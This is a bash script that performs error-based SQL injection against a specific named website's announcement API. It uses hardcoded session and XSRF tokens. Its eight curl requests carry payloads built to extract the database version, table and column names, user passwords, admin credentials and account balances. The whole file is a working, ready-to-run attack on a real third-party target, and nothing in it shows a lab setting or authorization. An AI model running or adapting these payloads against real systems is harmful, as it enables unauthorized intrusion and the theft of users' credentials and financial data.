#!/bin/bash

echo "🔥 ERROR-BASED EXTRACTION - GETTING REAL DATA 🔥"
echo "================================================"

# Extract tokens from user's request
XSRF_TOKEN="eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ%3D%3D"
SESSION_TOKEN="eyJpdiI6InBWTm5RXC9tR1pXT05DNDlKS1BDWUl3PT0iLCJ2YWx1ZSI6Im5xYzFZWmF1dW1SdkFnUFdOdERwRytBV0hTNkZaZ2RxdFwvZVAxNlV3QXVjWWFsNVdlWlFzSHNWUytyMU44TE1oIiwibWFjIjoiNjEyZTRkZGM2MDY5YzI5MWM1YTcwNjFiM2YwODAwMjVhMWVmN2JjNjdiYmQ4ODk3NzE3Njc3NGZhOGJlMWQwZiJ9"

# Target URL
TARGET="https://member.panama8888b.co"

echo "🎯 Using error-based injection to extract real data..."
echo ""

# Test 1: Extract database version via error
echo "🔍 Test 1: Extract Database Version via Error"
response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/api/announcement" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d '{"status":"test AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"}')

http_code=$(echo "$response" | tail -n1)
content=$(echo "$response" | head -n -1)
size=$(echo "$content" | wc -c)

echo "Response: $content"
echo "Size: $size bytes"
echo "HTTP Code: $http_code"
echo ""

# Test 2: Extract database name via error
echo "🔍 Test 2: Extract Database Name via Error"
response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/api/announcement" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d '{"status":"test AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"}')

http_code=$(echo "$response" | tail -n1)
content=$(echo "$response" | head -n -1)
size=$(echo "$content" | wc -c)

echo "Response: $content"
echo "Size: $size bytes"
echo "HTTP Code: $http_code"
echo ""

# Test 3: Extract table names via error
echo "🔍 Test 3: Extract Table Names via Error"
response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/api/announcement" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d '{"status":"test AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"}')

http_code=$(echo "$response" | tail -n1)
content=$(echo "$response" | head -n -1)
size=$(echo "$content" | wc -c)

echo "Response: $content"
echo "Size: $size bytes"
echo "HTTP Code: $http_code"
echo ""

# Test 4: Extract user data via error
echo "🔍 Test 4: Extract User Data via Error"
response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/api/announcement" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d '{"status":"test AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"}')

http_code=$(echo "$response" | tail -n1)
content=$(echo "$response" | head -n -1)
size=$(echo "$content" | wc -c)

echo "Response: $content"
echo "Size: $size bytes"
echo "HTTP Code: $http_code"
echo ""

# Test 5: Extract admin credentials via error
echo "🔍 Test 5: Extract Admin Credentials via Error"
response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/api/announcement" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d '{"status":"test AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users WHERE role=admin LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"}')

http_code=$(echo "$response" | tail -n1)
content=$(echo "$response" | head -n -1)
size=$(echo "$content" | wc -c)

echo "Response: $content"
echo "Size: $size bytes"
echo "HTTP Code: $http_code"
echo ""

# Test 6: Extract financial data via error
echo "🔍 Test 6: Extract Financial Data via Error"
response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/api/announcement" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d '{"status":"test AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT GROUP_CONCAT(user_id,0x3a,balance) FROM accounts LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"}')

http_code=$(echo "$response" | tail -n1)
content=$(echo "$response" | head -n -1)
size=$(echo "$content" | wc -c)

echo "Response: $content"
echo "Size: $size bytes"
echo "HTTP Code: $http_code"
echo ""

# Test 7: Extract system info via error
echo "🔍 Test 7: Extract System Info via Error"
response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/api/announcement" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d '{"status":"test AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,@@version,0x3a,@@hostname,0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"}')

http_code=$(echo "$response" | tail -n1)
content=$(echo "$response" | head -n -1)
size=$(echo "$content" | wc -c)

echo "Response: $content"
echo "Size: $size bytes"
echo "HTTP Code: $http_code"
echo ""

# Test 8: Extract column names via error
echo "🔍 Test 8: Extract Column Names via Error"
response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/api/announcement" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d '{"status":"test AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"}')

http_code=$(echo "$response" | tail -n1)
content=$(echo "$response" | head -n -1)
size=$(echo "$content" | wc -c)

echo "Response: $content"
echo "Size: $size bytes"
echo "HTTP Code: $http_code"
echo ""

echo "🎯 ERROR-BASED EXTRACTION COMPLETED"
echo "==================================="
echo "Analysis of error-based responses:"
echo "- Error messages may contain database information"
echo "- Look for data between ~ characters in error messages"
echo "- Different response patterns indicate successful injection"
echo ""
echo "🔍 REAL DATA EXTRACTION ATTEMPTED"